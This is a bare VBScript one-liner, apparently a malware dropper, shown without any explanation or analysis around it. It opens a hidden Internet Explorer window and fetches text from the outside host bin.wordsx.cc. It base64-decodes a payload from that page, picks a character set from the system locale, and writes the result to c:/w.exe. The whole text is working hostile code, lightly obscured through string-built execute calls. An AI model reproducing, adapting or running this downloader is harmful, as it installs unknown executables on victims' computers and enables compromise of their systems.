q=GetLocale():l1="1054":l2="1041":l3="1042":l4="2052":l5="1028 3076":l6="1050 1029 1038 1045 1048 1051 1060":l7="1026 1049":l8="1046 1027 1030 1043 1033 1035 1036 1031 1040 1044 2070 3082 1053":l9="1032":l10="1055":l11="1037":l12="1025":l13="1061 1062 1063":l = "windows-":r = Array(874,932,949,936,950,1250,1251,1252,1253,1254,1255,1256,1257):for i=0 to 12:execute "if instr(l"+CStr(i+1)+",q)"+CStr(chr(60))+CStr(chr(62))+Cstr("0 then l=CStr(l)+CStr(")+Cstr(r(i))+") end if":next:set IE=WScript.CreateObject("InternetExplorer.Application"):IE.Visible=false:IE.Navigate("http://bin.wordsx.cc/dia172/test.txt"):While Ie.Busy=true:WScript.Sleep(100):Wend:Set cl=IE.Document.getElementsByTagName("pre"):ad="ADODB.Stream":set W=CreateObject(ad):W.Type=2:W.Open:W.WriteText B64D(cl(0).innerHTML):W.Position=0:set A=CreateObject(ad):A.Type=2:A.Charset=l:A.Open:W.CopyTo A:A.SaveToFile "c:/w.exe",2:W.Close:A.Close:Function B64D(ByVal b6S):Const B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/":Dim B:For B=1 To Len(b6S) Step 4:Dim C,G:G=0:For C=0 To 3:G=64*G+InStr(1,B64,Mid(b6S,B+C,1),vbBinaryCompare)-1:Next:O=O+Chr((G and 16711680)/65536)+Chr((G and 65280)/256)+Chr(G and 255):Next:B64D=O:End Function:
